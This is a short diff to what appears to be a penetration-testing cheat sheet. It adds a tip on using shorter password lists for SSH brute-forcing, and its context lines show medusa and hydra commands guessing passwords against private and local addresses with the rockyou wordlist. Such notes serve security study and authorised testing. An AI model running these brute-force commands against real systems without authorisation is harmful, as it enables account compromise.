@@ -634,6 +634,7 @@ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR
 ```
 
 ## hydra
+For ssh try shorter password lists like ``/usr/share/wfuzz/wordlist/others/common_pass.txt``
 ```
 hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-get
